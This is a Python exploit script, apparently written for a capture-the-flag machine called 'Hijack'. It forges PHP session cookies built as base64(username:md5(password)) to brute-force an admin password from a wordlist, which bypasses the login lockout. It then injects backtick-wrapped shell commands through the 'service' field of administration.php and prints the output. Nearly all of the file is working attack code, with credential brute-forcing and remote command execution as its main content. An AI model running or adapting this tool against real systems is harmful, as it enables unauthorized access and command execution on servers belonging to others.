#!/usr/bin/env python3

import argparse
import base64
import hashlib
import os
import platform
import requests

ADMIN_FAIL = "Access denied, only the admin can access this page."
COOKIE_KEY = "PHPSESSID"

class CookieMonster:
    def __init__(self, baseurl:str, username:str, passfile:str) -> None:
        if not(isinstance(baseurl,str)):
            raise TypeError(f"baseurl must be a string. got {type(baseurl)}")
        
        baseurl = baseurl.strip("/").strip()
        if len(baseurl) < 1:
            raise ValueError("baseurl must be a non-zero length string")
        
        if not(isinstance(username,str)):
            raise TypeError(f"username must be a string. got {type(username)}")
        
        username = username.strip()
        if len(username) < 1:
            raise ValueError("username must be a non-zero length string")
        
        if not(isinstance(passfile,str)):
            raise TypeError(f"passfile must be a string. got {type(passfile)}")
        
        passfile = passfile.strip()
        if len(passfile) < 1:
            raise ValueError("passfile must be a non-zero length string")
        
        self.__baseurl = baseurl
        self.__cookie = str()
        self.__passfile = passfile
        self.__session = requests.Session()
        self.__timeout = 10
        self.__username = username
        return
    
    def __gen_passwords(self):
        """
        generator designed to spit out passwords that
        are in a wordlist file. this will continue to
        yield passwords until end-of-file is reached.
        """
        with open(self.__passfile) as fptr:
            for curline in fptr.readlines():
                curline = curline.strip()
                yield curline
        return
    
    def __encode_cookie(self, password:str):
        """
        function designed to force a PHPSESSID cookie for Hijack.
        this will format the raw data, base64 encode it and url-encode
        the "=" padding.

        cookie format: base64(<username>:md5(<password>))

        the cookie format can be discovered by creating an account
        and inspecting the cookie after login. base64 decoding the
        cookie shows "<username>:md5(<password>)".
        """
        password_hash = hashlib.md5(password.encode("utf-8")).hexdigest()
        cookie_format = f"{self.__username}:{password_hash}"
        encoded = base64.b64encode(cookie_format.encode("utf-8")).decode().replace("=", "%3D", -1)
        return encoded
    
    def __test_password(self, cookie_val:str):
        """
        function designed to brute-force the admin password by
        creating a cookie and making a request to the administration.php
        page. the cookie format is base64(<username>:md5(<password>)).

        this allows an attacker to bypass the login.php brute-force
        protections. if the attacker tries brute-forcing login.php, the
        account gets locked for 3 minutes after 5 failed attempts. testing
        the cookies does not have any limits or cause any lockouts.
        """
        message = str()
        success = bool()
        target_route = "administration.php"
        target_url = f"{self.__baseurl}/{target_route}"

        try:
            if not(isinstance(cookie_val,str)):
                raise TypeError(f"cookie_val must be a string. got {type(cookie_val)}")
            
            cookies = {COOKIE_KEY: cookie_val}

            resp = requests.get(target_url, cookies=cookies, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"invalid cookie ({resp.status_code} {resp.reason})")
            
            if ADMIN_FAIL in resp.text:
                raise ValueError("incorrect password")
            
            self.__cookie = cookies
            
            message = "password found"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)
    
    def BruteAdminPass(self):
        """
        function designed to discover the password of a 
        user based on a wordlist provided. this will call
        the "__test_password" function on each password
        yielded by the generator until one is found or none
        are left.
        """
        found = bool()
        message = str()
        pass_gen = self.__gen_passwords()
        password = str()
        success = bool()

        try:
            for curpass in pass_gen:
                SysMsgNB(f"testing \"{curpass}\" ...")
                success, message = self.__test_password(self.__encode_cookie(curpass))
                if not(success):
                    continue
                password = curpass
                found = True
                break

            if not(found):
                raise ValueError("password not found in wordlist")

            message = "admin password found"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (password, success, message)
    
    def ExecuteCommand(self, command:str):
        """
        function designed to exploit the command injection vulnerability
        on the administration.php page after access had been granted. this
        will only work if the correct password has been discovered and the
        administrative cookie has been set.
        """
        message = str()
        success = bool()
        target_route = "administration.php"
        target_url = f"{self.__baseurl}/{target_route}"

        try:
            if not(isinstance(command,str)):
                raise TypeError(f"command must be a string. got {type(command)}")
            
            command = nonempty_str(command)
            inject = f"`{command}`"

            payload = {"service": inject, "submit": ""}

            resp = self.__session.post(target_url, data=payload, timeout=self.__timeout, cookies=self.__cookie)
            if "command injection detected" in resp.text:
                raise ValueError("command injection failed")
            elif ADMIN_FAIL in resp.text:
                raise ValueError("admin access not granted. must obtain cookie first")
            
            print(resp.text)

            message = "command successfully executed"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)


############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_GRN}[+]{ANSI_RST} {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_RED}[-]{ANSI_RST} {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def nonempty_str(value):
    value = value.strip()
    if len(value) < 1:
        raise TypeError("string cannot be empty")
    return value

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)

    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    parser.add_argument("--passfile", help="file containing passwords", type=nonempty_str, dest="passfile", default="/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt")
    parser.add_argument("--username", help="username to brute", type=nonempty_str, default="admin", dest="username")

    parser.add_argument("--command", help="command to execute on target", type=nonempty_str, default="whoami", dest="command")

    args = parser.parse_args()

    target = args.target
    port = args.port
    secure = args.secure

    username = args.username
    passfile = args.passfile

    command = args.command

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    InfoMsg(f"Username: {username}")
    InfoMsg(f"Passfile: {passfile}")
    InfoMsg(f"Command: {command}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseurl = f"{scheme}://{target}:{port}"

    try:
        monster = CookieMonster(baseurl=baseurl, username=username, passfile=passfile)

        # attempt to brute-force the administrative password.
        password, success, message = monster.BruteAdminPass()
        if not(success):
            raise ValueError(message)
        SucMsg(message)

        SucMsg(f"Password: {password}")

        # exploit the command injection vulnerability on the
        # administration screen and execute a command.
        success, message = monster.ExecuteCommand(command=command)
        if not(success):
            raise ValueError(message)
        SucMsg(message)
    except Exception as ex:
        ErrMsg(str(ex))

    return

if __name__ == "__main__":
    main()

